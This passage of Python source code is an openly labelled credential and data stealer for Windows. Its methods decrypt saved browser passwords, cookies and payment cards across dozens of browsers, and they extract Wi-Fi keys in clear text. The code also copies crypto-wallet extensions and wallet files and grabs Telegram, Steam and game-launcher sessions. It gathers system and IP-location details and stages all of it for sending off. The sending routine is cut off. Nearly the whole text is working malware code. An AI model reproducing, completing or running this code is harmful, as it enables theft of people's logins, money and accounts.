                logging.info(f"Successfully read AES key from {key_file}")
                return key_bytes
            except ValueError as e:
                logging.error(f"Invalid hex key in {key_file}: {e}")
                raise ValueError(f"Invalid hex key format: {hex_key}")
        except Exception as e:
            logging.error(f"Failed to read key from {key_file}: {e}")
            raise

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes, data_type: str = "unknown", browser: str = "unknown") -> str:
        try:
            if len(EncrypedValue) < 31:  # Minimum: 3 (prefix) + 12 (iv) + 16 (tag) + 1 (payload)
                logging.warning(f"Encrypted {data_type} too short: {len(EncrypedValue)} bytes for {browser} data {EncrypedValue[:10].hex()}...")
                return "[Decryption Failed]"
            prefix = EncrypedValue[:3]
            if prefix in (b'v10', b'v11', b'v20'):
                iv = EncrypedValue[3:15]
                payload = EncrypedValue[15:-16]
                authentication_tag = EncrypedValue[-16:]
                if not payload:
                    logging.warning(f"Empty payload for {data_type} {EncrypedValue[:10].hex()} (prefix {prefix.decode('ascii')}...) in {browser}")
                    return "[Decryption Failed]"
                logging.info(f"Decrypting {prefix.decode('ascii')} {data_type} {EncrypedValue[:10].hex()}... for {browser}")
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=default_backend())
                decryptor = cipher.decryptor()
                decrypted_bytes = decryptor.update(payload) + decryptor.finalize()
                try:
                    # For v20 cookies, skip first 32 bytes (optional, disabled for passwords/cards)
                    # if prefix == b'v20' and data_type == "cookie":
                    #     if len(decrypted_bytes) < 32:
                    #         logging.warning(f"Decrypted v20 {data_type} too short: {len(decrypted_bytes)} bytes for {browser}")
                    #         return "[Decryption Failed]"
                    #     decrypted_bytes = decrypted_bytes[32:]
                    # Decode entire plaintext for v10, v11, v20
                    result = decrypted_bytes.decode('utf-8')
                    logging.info(f"Successfully decrypted {prefix.decode('ascii')} {data_type} for {browser}")
                    return result
                except UnicodeDecodeError as e:
                    logging.warning(f"UTF-8 decode failed for {data_type} {EncrypedValue[:10].hex()} (prefix {prefix.decode('ascii')}...) in {browser}: {e}")
                    return "[Decryption Failed]"
            else:
                logging.info(f"Attempting DPAPI decryption for {data_type} {EncrypedValue[:10].hex()} (prefix {prefix.decode('ascii', errors='ignore')}...) in {browser}")
                decrypted_bytes = SubModules.CryptUnprotectData(EncrypedValue)
                try:
                    return decrypted_bytes.decode('utf-8')
                except UnicodeDecodeError as e:
                    logging.warning(f"UTF-8 decode failed for DPAPI {data_type} {decrypted_bytes[:10].hex()}... in {browser}: {e}")
                    return "[Decryption Failed]"
        except InvalidTag as e:
            logging.error(f"AES-GCM decryption failed for {data_type} {EncrypedValue[:10].hex()} (prefix {prefix.decode('ascii', errors='ignore')}...) in {browser}: Invalid authentication tag, possible incorrect key or corrupted data")
            return "[Decryption Failed]"
        except Exception as e:
            logging.error(f"Decryption failed for {data_type} {EncrypedValue[:10].hex()} (prefix {prefix.decode('ascii', errors='ignore')}...) in {browser}: {e}", exc_info=True)
            return "[Decryption Failed]"

class StealSystemInformation:
    async def FunctionRunner(self) -> None:
        try:
            tasks = [
                asyncio.create_task(self.StealSystemInformation()),
                asyncio.create_task(self.StealWifiInformation()),
                asyncio.create_task(self.StealProcessInformation()),
                asyncio.create_task(self.StealNetworkInformation()),
            ]

            await asyncio.gather(*tasks)
        except Exception as error:
            print(f"Pinging")

    async def GetDefaultSystemEncoding(self) -> str:
        try:
            cmd = "cmd.exe /c chcp"
            process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await process.communicate()
            return stdout.decode(errors="ignore").split(":")[1].strip()
        except:
            return "null"

    async def StealSystemInformation(self) -> None:
        current_code_page = await self.GetDefaultSystemEncoding()
        result = await asyncio.create_subprocess_shell(r'echo System Info & systeminfo & echo Tasklist & tasklist /svc & echo Ipconfig & ipconfig/all & echo Route Table & route print & echo Firewallinfo & netsh firewall show state & netsh firewall show config', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
        stdout, stderr = await result.communicate()
        Variables.SystemInfo.append(stdout.decode(current_code_page))

    async def StealProcessInformation(self) -> None:
        process = await asyncio.create_subprocess_shell(
            "tasklist /FO LIST",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            shell=True
        )
        stdout, stderr = await process.communicate()
        Variables.Processes.append(stdout.decode(errors="ignore"))

    async def StealNetworkInformation(self) -> None:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://ip-api.com/json") as response:
                data = await response.json()
                ip = data["query"]
                country = data["country"]
                city = data["city"]
                timezone = data["timezone"]
                isp_info = data["isp"] + f" {data['org']} {data['as']}"
                Variables.Network.append((ip, country, city, timezone, isp_info))

    async def StealWifiInformation(self) -> None:
        current_code_page = await self.GetDefaultSystemEncoding()

        process = await asyncio.create_subprocess_shell(
            "netsh wlan show profiles",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            shell=True)

        stdout, stderr = await process.communicate()
        decoded_profiles = None

        try:
            decoded_profiles = stdout.decode(current_code_page)
        except:
            decoded_profiles = stdout.decode(errors="ignore")

        wifi_profile_names = re.findall(r'All User Profile\s*: (.*)', decoded_profiles)
        for profile_name in wifi_profile_names:
            result = await asyncio.create_subprocess_shell(
                f'netsh wlan show profile name="{profile_name}" key=clear',
                stdout=asyncio.subprocess.PIPE,
                shell=True,
                encoding=None
            )
            stdout, _ = await result.communicate()
            try:
                profile_output = stdout.decode(current_code_page)
            except:profile_output = stdout.decode(errors="ignore")
            wifi_passwords = re.search(r'Key content\s*: (.*)', profile_output, re.IGNORECASE)

            Variables.Wifis.append((profile_name, wifi_passwords.group(1) if wifi_passwords else "No password found"))

class Main:
    def __init__(self) -> None:
        self.profiles_full_path = list()
        self.RoamingAppData = os.getenv('APPDATA')
        self.LocalAppData = os.getenv('LOCALAPPDATA')
        self.Temp = os.getenv('TEMP')
        self.FireFox = bool()
        self.FirefoxFilesFullPath = list()
        self.FirefoxCookieList = list()
        self.FirefoxHistoryList = list()
        self.FirefoxAutofiList = list()
    async def FunctionRunner(self):
        self.list_profiles()
        self.ListFirefoxProfiles()
        taskk = [
            asyncio.create_task(self.GetPasswords()),
            asyncio.create_task(self.GetCards()),
            asyncio.create_task(self.GetCookies()),
            asyncio.create_task(self.GetFirefoxCookies()),
            asyncio.create_task(self.GetHistory()),
            asyncio.create_task(self.GetFirefoxHistorys()),
            asyncio.create_task(self.GetDownload()),
            asyncio.create_task(self.GetBookMark()),
            asyncio.create_task(self.GetAutoFill()),
            asyncio.create_task(self.GetFirefoxAutoFills()),
            StealSystemInformation().FunctionRunner()
            ]
        await asyncio.gather(*taskk)
        await self.WriteToText()
        await self.SendAllData()
    def list_profiles(self) -> None:
        directorys = {
            'Google Chrome': os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
            'Opera': os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
            'Opera GX': os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),
            'Brave': os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
            'Edge': os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
            'Vivaldi': os.path.join(self.LocalAppData, "Vivaldi", "User Data"),
            'Yandex': os.path.join(self.LocalAppData, "Yandex", "YandexBrowser", "User Data"),
            'Chromium': os.path.join(self.LocalAppData, "Chromium", "User Data"),
            'Firefox': os.path.join(self.RoamingAppData, "Mozilla", "Firefox", "Profiles"),
            'Safari': os.path.join(self.LocalAppData, "Apple Computer", "Safari"),
            'Maxthon': os.path.join(self.LocalAppData, "Maxthon", "User Data"),
            'UC Browser': os.path.join(self.LocalAppData, "UCBrowser", "User Data"),
            'Torch': os.path.join(self.LocalAppData, "Torch", "User Data"),
            'Comodo Dragon': os.path.join(self.LocalAppData, "Comodo", "Dragon", "User Data"),
            'Slimjet': os.path.join(self.LocalAppData, "Slimjet", "User Data"),
            'Pale Moon': os.path.join(self.RoamingAppData, "Moonchild Productions", "Pale Moon", "Profiles"),
            'Waterfox': os.path.join(self.RoamingAppData, "Waterfox", "Profiles"),
            'SeaMonkey': os.path.join(self.RoamingAppData, "Mozilla", "SeaMonkey", "Profiles"),
            'Epic Privacy Browser': os.path.join(self.LocalAppData, "Epic Privacy Browser", "User Data"),
            'Cent Browser': os.path.join(self.LocalAppData, "CentBrowser", "User Data"),
            'CocCoc': os.path.join(self.LocalAppData, "CocCoc", "Browser", "User Data"),
            'Avast Secure Browser': os.path.join(self.LocalAppData, "AVAST Software", "Browser", "User Data"),
            'Falkon': os.path.join(self.LocalAppData, "Falkon", "User Data"),
            'Midori': os.path.join(self.LocalAppData, "Midori", "User Data"),
            'QuteBrowser': os.path.join(self.LocalAppData, "QuteBrowser", "User Data"),
            'Iridium': os.path.join(self.LocalAppData, "Iridium", "User Data"),
            'SlimBrowser': os.path.join(self.LocalAppData, "SlimBrowser", "User Data"),
            'Avant Browser': os.path.join(self.LocalAppData, "Avant", "User Data"),
            'SRWare Iron': os.path.join(self.LocalAppData, "SRWare Iron", "User Data"),
            'Ghost Browser': os.path.join(self.LocalAppData, "Ghost Browser", "User Data"),
            'Blisk': os.path.join(self.LocalAppData, "Blisk", "User Data"),
            'Citrio': os.path.join(self.LocalAppData, "CatalinaGroup", "Citrio", "User Data"),
            'Coowon': os.path.join(self.LocalAppData, "Coowon", "User Data"),
            'Orbitum': os.path.join(self.LocalAppData, "Orbitum", "User Data"),
            'Sleipnir': os.path.join(self.LocalAppData, "Fenrir Inc", "Sleipnir", "User Data"),
            '360 Browser': os.path.join(self.LocalAppData, "360Browser", "Browser", "User Data"),
            'Baidu Browser': os.path.join(self.LocalAppData, "Baidu", "BaiduBrowser", "User Data"),
            'Chedot': os.path.join(self.LocalAppData, "Chedot", "User Data"),
            'Sputnik': os.path.join(self.LocalAppData, "Sputnik", "Sputnik", "User Data"),
            'Torch': os.path.join(self.LocalAppData, "Torch", "User Data"),
            'Avira Scout': os.path.join(self.LocalAppData, "Avira", "Scout", "User Data"),
            'Cliqz': os.path.join(self.LocalAppData, "Cliqz", "User Data"),
            'Cocoon': os.path.join(self.LocalAppData, "Cocoon", "User Data"),
            'Dooble': os.path.join(self.LocalAppData, "Dooble", "User Data"),
            'Flock': os.path.join(self.LocalAppData, "Flock", "User Data"),
            'K-Meleon': os.path.join(self.LocalAppData, "K-Meleon", "User Data"),
            'Lunascape': os.path.join(self.LocalAppData, "Lunascape", "User Data"),
            'Netscape': os.path.join(self.LocalAppData, "Netscape", "User Data"),
            'Roccat': os.path.join(self.LocalAppData, "Roccat", "User Data"),
            'Sleipnir': os.path.join(self.LocalAppData, "Sleipnir", "User Data"),
            'Wyzo': os.path.join(self.LocalAppData, "Wyzo", "User Data"),
        }
        for junk, directory in directorys.items():
            if os.path.isdir(directory):
                if "Opera" in directory:
                    self.profiles_full_path.append(directory)
                else:
                    for root, folders, files in os.walk(directory):
                        for folder in folders:
                            folder_path = os.path.join(root, folder)
                            if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder:
                                self.profiles_full_path.append(folder_path)
    def ListFirefoxProfiles(self) -> None:
        try:
            directory = os.path.join(self.RoamingAppData , "Mozilla", "Firefox", "Profiles")
            if os.path.isdir(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file.endswith("cookies.sqlite") or file.endswith("places.sqlite") or file.endswith("formhistory.sqlite"):
                            self.FirefoxFilesFullPath.append(file_path)
        except:
            pass
    async def GetFirefoxCookies(self) -> None:
        try:
            for files in self.FirefoxFilesFullPath:
                if "cookie" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                    twitch_username = None
                    twitch_cookie = None
                    cookies = cursor.fetchall()
                    for cookie in cookies:
                        self.FirefoxCookieList.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n")

        except:
            pass
        else:
            self.FireFox = True
    async def GetFirefoxHistorys(self) -> None:
        try:
            for files in self.FirefoxFilesFullPath:
                if "places" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                    historys = cursor.fetchall()
                    for history in historys:
                        self.FirefoxHistoryList.append(f"ID: {history[0]}\nRL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n====================================================================================\n")
        except:
            pass
        else:
            self.FireFox = True
    async def GetFirefoxAutoFills(self) -> None:
        try:
            for files in self.FirefoxFilesFullPath:
                if "formhistory" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute("select * from moz_formhistory")
                    autofills = cursor.fetchall()
                    for autofill in autofills:
                        self.FirefoxAutofiList.append(f"{autofill}\n")
        except:
            pass
        else:
            self.FireFox = True
    async def GetPasswords(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                LoginData = os.path.join(path, "Login Data")
                copied_file_path = os.path.join(self.Temp, "Logins.db")
                shutil.copyfile(LoginData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select origin_url, username_value, password_value from logins')
                logins = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for login in logins:
                    if login[0] and login[1] and login[2]:
                        Variables.Passwords.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {SubModules.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
        except:
            pass
    async def GetCards(self) -> None:
        try:
            for path in self.profiles_full_path:
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                WebData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "Web.db")
                shutil.copyfile(WebData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards')
                cards = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for card in cards:
                    if card[2] < 10:
                        month = "0" + str(card[2])
                    else:month = card[2]
                    Variables.Cards.append(f"{SubModules.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n")
        except:
            pass
    async def GetCookies(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                CookieData = os.path.join(path, "Network", "Cookies")
                copied_file_path = os.path.join(self.Temp, "Cookies.db")
                try:
                    shutil.copyfile(CookieData, copied_file_path)
                except:
                    pass
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select host_key, name, path, encrypted_value,expires_utc from cookies')
                cookies = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for cookie in cookies:
                    dec_cookie = SubModules.Decrpytion(cookie[3], key)
                    Variables.Cookies.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")

        except:
            pass
    async def GetWallets(self, copied_path: str) -> None:
        try:
            wallets_ext_names = {
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",  # Correct, verified for MetaMask
                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",   # Correct, Binance Chain Wallet
                "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",  # Correct, Phantom Wallet
                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad", # Correct, Coinbase Wallet
                "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",   # Correct, Ronin Wallet
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",  # Correct, Exodus Web3 Wallet
                "Coin98": "aeachknmefphepccionboohckonoeemg",  # Correct, Coin98 Wallet
                "KardiaChain": "pdadjkfkgcafgbceimcpbkalnfnepbnk", # Correct, KardiaChain Wallet
                "TerraStation": "aiifbnbfobpmeekipheeijimdpnlpgpp", # Correct, Terra Station Wallet
                "Wombat": "amkmjjmmflddogmhpjloimipbofnfjih",  # Correct, Wombat Wallet
                "Harmony": "fnnegphlobjdpkhecapkijjdkgcjhkib", # Correct, Harmony Wallet
                "Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",   # Correct, Nami Wallet (Cardano)
                "MartianAptos": "efbglgofoippbgcjepnhiblaibcnclgk", # Correct, Martian Aptos Wallet
                "Braavos": "jnlgamecbpmbajjfhmmmlhejkemejdma",  # Correct, Braavos Wallet (Starknet)
                "XDEFI": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",   # Correct, XDEFI Wallet
                "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",   # Correct, Yoroi Wallet (Cardano)
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",     # Correct, TON Wallet
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai", # Correct, Authenticator (2FA, not strictly a crypto wallet)
                "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm", # Correct, MetaMask for Edge (different ID)
                "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",    # Correct, TronLink
                "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph", # Correct, Trust Wallet
                "Crypto.com": "fhilaheimglignddkjgofkcbgekhenbh", # Correct, Crypto.com DeFi Wallet
                "Solflare": "bhhhlbepdkbapadjdnnoeckheehbglkc", # Correct, Solflare Wallet
                "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",   # Correct, Keplr Wallet
                "Polkadot": "jojhfehknppankmoafhnhkepdeodfknp", # Correct, Polkadot{.js} Extension
                "Avalanche": "nkbihfbeogaeaoehlefnkodbefgpgknn", # Same as MetaMask (Avalanche uses MetaMask)
                "BraveWallet": "odbfpeeihdkbihmopkbjmoonfanlbfcl", # Correct, Brave Wallet (native to Brave browser)
                "Zerion": "klghhnkeealcohjjanjjdagdfoafgdmc",  # Correct, Zerion Wallet
                "MyEtherWallet": "nlbmnnijcnlegkjjpcfjclmcfggfefbh", # Correct, MyEtherWallet (different from MetaMask)
                "SafePal": "lpfcbjknijpeeillifnkikgncikgfhdo"   # Same as Nami, incorrect; SafePal is primarily a mobile/hardware wallet
            }
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
                "Zcash": os.path.join(self.RoamingAppData, "Zcash"),
                "Armory": os.path.join(self.RoamingAppData, "Armory"),
                "Bytecoin": os.path.join(self.RoamingAppData, "bytecoin"),
                "Jaxx": os.path.join(self.RoamingAppData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
                "Exodus": os.path.join(self.RoamingAppData, "Exodus", "exodus.wallet"),
                "Ethereum": os.path.join(self.RoamingAppData, "Ethereum", "keystore"),
                "Electrum": os.path.join(self.RoamingAppData, "Electrum", "wallets"),
                "AtomicWallet": os.path.join(self.RoamingAppData, "atomic", "Local Storage", "leveldb"),
                "Guarda": os.path.join(self.RoamingAppData, "Guarda", "Local Storage", "leveldb"),
                "Coinomi": os.path.join(self.RoamingAppData, "Coinomi", "Coinomi", "wallets"),
                "Litecoin": os.path.join(self.RoamingAppData, "Litecoin", "wallets"),
                "Dash": os.path.join(self.RoamingAppData, "Dash", "wallets"),
                "Dogecoin": os.path.join(self.RoamingAppData, "Dogecoin", "wallets"),
                "Monero": os.path.join(self.RoamingAppData, "monero-project", "monero-core"),
                "Ripple": os.path.join(self.RoamingAppData, "Ripple", "wallets"),
                "Cardano": os.path.join(self.RoamingAppData, "Daedalus", "wallets"),
                "Polkadot": os.path.join(self.RoamingAppData, "Polkadot", "wallets"),
                "Solana": os.path.join(self.RoamingAppData, "Solana", "wallets"),
                "Tezos": os.path.join(self.RoamingAppData, "Tezos", "wallets"),
                "Stellar": os.path.join(self.RoamingAppData, "Stellar", "wallets"),
                "NEO": os.path.join(self.RoamingAppData, "NEO", "wallets"),
                "Tron": os.path.join(self.RoamingAppData, "Tron", "wallets"),
                "VeChain": os.path.join(self.RoamingAppData, "VeChain", "wallets")
            }
            os.mkdir(os.path.join(copied_path, "Wallets"))
            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings")
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        if os.path.isdir(os.path.join(ext_path, wallet_addr)):
                            try:
                                splited = os.path.join(ext_path, wallet_addr).split("\\")
                                file_name = f"{splited[5]} {splited[6]} {splited[8]} {wallet_name}"
                                os.makedirs(copied_path + "\\Wallets\\" + file_name)
                                shutil.copytree(os.path.join(ext_path, wallet_addr), os.path.join(copied_path, "Wallets", file_name, wallet_addr))
                            except:
                                continue
            for wallet_names, wallet_paths in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_paths):
                        shutil.copytree(wallet_paths, os.path.join(copied_path, "Wallets", wallet_names))
                except:
                    continue
        except:
            pass
    async def GetHistory(self) -> None:
        try:
            for path in self.profiles_full_path:
                HistoryData = os.path.join(path, "History")
                copied_file_path = os.path.join(self.Temp, "HistoryData.db")
                shutil.copyfile(HistoryData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select id, url, title, visit_count, last_visit_time from urls')
                historys = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for history in historys:
                    Variables.Historys.append(f"ID : {history[0]}\nURL : {history[1]}\nitle : {history[2]}\nVisit Count : {history[3]}\nLast Visit Time {history[4]}\n====================================================================================\n")
        except:
            pass

    async def GetAutoFill(self) -> None:
        try:
            for path in self.profiles_full_path:
                AutofillData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "AutofillData.db")
                shutil.copyfile(AutofillData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select * from autofill')
                autofills = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for autofill in autofills:
                    if autofill:
                        Variables.Autofills.append(f"{autofill}\n")
        except Exception as e:print("Pinging")

    async def GetBookMark(self) -> None:
        try:
            for path in self.profiles_full_path:
                BookmarkData = os.path.join(path, "Bookmarks")
                if os.path.isfile(BookmarkData):
                    with open(BookmarkData, "r", encoding="utf-8", errors="ignore") as file:
                        data = json.load(file)
                    data = data["roots"]["bookmark_bar"]["children"]
                    if data:
                        Variables.Bookmarks.append(f"Browser Path : {path}\nID : {data['id']}\nName : {data['name']}\nURL : {data['url']}\nGUID : {data['guid']}\nAdded At : {data['date_added']}\n\n=========================================================")
        except:
            pass
    async def GetDownload(self) -> None:
        try:
            for path in self.profiles_full_path:
                DownloadData = os.path.join(path, "History")
                copied_file_path = os.path.join(self.Temp, "DownloadData.db")
                shutil.copyfile(DownloadData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select tab_url, target_path from downloads')
                downloads = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for download in downloads:
                    Variables.Downloads.append(f"Downloaded URL: {download[0]}\nDownloaded Path: {download[1]}\n\n")
        except:
            pass
    async def StealUplay(self, uuid:str) -> None:
        try:
            found_ubisoft = False
            ubisoft_path = os.path.join(self.LocalAppData, "Ubisoft Game Launcher")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Uplay")
            if os.path.isdir(ubisoft_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                for file in os.listdir(ubisoft_path):
                    name_of_files = os.path.join(ubisoft_path, file)
                    try:
                        shutil.copy(name_of_files, os.path.join(copied_path, file))
                        found_ubisoft = True
                    except:
                        continue
                if found_ubisoft == True:
                    pass
        except:
            pass
    async def StealEpicGames(self, uuid:str) -> None:
        try:
            found_epic = False
            epic_path = os.path.join(self.LocalAppData, "EpicGamesLauncher", "Saved", "Config", "Windows")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Epic Games")
            if os.path.isdir(epic_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                try:
                    shutil.copytree(epic_path, os.path.join(copied_path, "Windows"))
                    found_epic = True
                except:
                    pass
            if found_epic == True:
                pass
        except:
            pass
    async def StealGrowtopia(self, uuid:str) -> None:
        try:
            found_growtopia = False
            growtopia_path = os.path.join(self.LocalAppData, "Growtopia", "save.dat")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Growtopia")
            if os.path.isfile(growtopia_path):
                found_growtopia = True
                shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
            if found_growtopia == True:
                pass
        except:
            pass
    async def StealTelegramSession(self, directory_path: str) -> None:
        try:
            found_tg = False
            tg_path = os.path.join(self.RoamingAppData, "Telegram Desktop", "tdata")
            if os.path.exists(tg_path):
                copy_path = os.path.join(directory_path, "Telegram Session")
                black_listed_dirs = [
                    "dumps", "emojis", "user_data", "working", "emoji",
                    "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"
                ]
                if not os.path.exists(copy_path):
                    os.mkdir(copy_path)
                for dirs in os.listdir(tg_path):
                    try:
                        _path = os.path.join(tg_path, dirs)
                        if not dirs in black_listed_dirs:
                            dir_name = _path.split("\\")[7]
                            if os.path.isfile(_path):
                                shutil.copyfile(_path, os.path.join(copy_path, dir_name))
                            elif os.path.isdir(_path):
                                shutil.copytree(_path, os.path.join(copy_path, dir_name))
                            found_tg = True
                    except:
                        continue
                if found_tg:
                    pass
        except:
            pass

    async def StealSteamSessionFiles(self, uuid:str) -> None:
        try:
            save_path = os.path.join(self.Temp, uuid)
            steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
            if os.path.isdir(steam_path):
                to_path = os.path.join(save_path, "Games", "Steam")
                if not os.path.isdir(to_path):
                    os.mkdir(to_path)
                shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
                with open(os.path.join(to_path, "How to Use.txt"),"w", errors="ignore", encoding="utf-8") as file:
                    file.write("")
        except:
            return "null"

    async def WriteToText(self) -> None:
        try:
            cmd = "wmic csproduct get uuid"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )

            stdout, stderr = await process.communicate()
            output_lines = stdout.decode(errors="ignore").split("\n")
            uuid = output_lines[1].strip() if len(output_lines) > 1 else ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            filePath = os.path.join(self.Temp, uuid)
            if os.path.isdir(filePath):
                shutil.rmtree(filePath)
            os.mkdir(filePath)
            os.mkdir(os.path.join(filePath, "Browsers"))
            os.mkdir(os.path.join(filePath, "Sessions"))
            os.mkdir(os.path.join(filePath, "Tokens"))
            os.mkdir(os.path.join(filePath, "Games"))
            await self.GetWallets(filePath)
            await self.StealTelegramSession(filePath)
            await self.StealUplay(uuid)
            await self.StealEpicGames(uuid)
            await self.StealGrowtopia(uuid)
            await self.StealSteamSessionFiles(uuid)
            if len(os.listdir(os.path.join(filePath, "Games"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Games"))
                except:pass
            if self.FireFox:
                os.mkdir(os.path.join(filePath, "Browsers", "Firefox"))
            password_list = Variables.Passwords
            card_list = Variables.Cards
            cookie_list = Variables.Cookies
            history_list = Variables.Historys
            bookmark_list = Variables.Bookmarks
            autofill_list = Variables.Autofills
            download_list = Variables.Downloads
            steam_acc = Variables.SteamAccounts

            processList = Variables.Processes
            file_paths = {
                "process_info.txt": processList,
                "last_clipboard.txt": Variables.ClipBoard,
                os.path.join("Browsers", "Firefox", "Cookies.txt"): self.FirefoxCookieList,
                os.path.join("Browsers", "Firefox", "History.txt"): self.FirefoxHistoryList,
                os.path.join("Browsers", "Firefox", "Autofills.txt"): self.FirefoxAutofiList,
                os.path.join("Browsers", "Passwords.txt"): password_list,
                os.path.join("Browsers", "Cards.txt"): card_list,
                os.path.join("Browsers", "Cookies.txt"): cookie_list,
                os.path.join("Browsers", "Historys.txt"): history_list,
                os.path.join("Browsers", "Autofills.txt"): autofill_list,
                os.path.join("Browsers", "Bookmarks.txt"): bookmark_list,
                os.path.join("Browsers", "Downloads.txt"): download_list,
                os.path.join("Sessions", "steam_sessions.txt"): steam_acc,
                os.path.join("Tokens", "discord_accounts.txt"): Variables.DiscordAccounts,
                os.path.join("Tokens", "full_tokens.txt"): Variables.FullTokens,
                os.path.join("Tokens", "validated_tokens.txt"): Variables.ValidatedTokens,
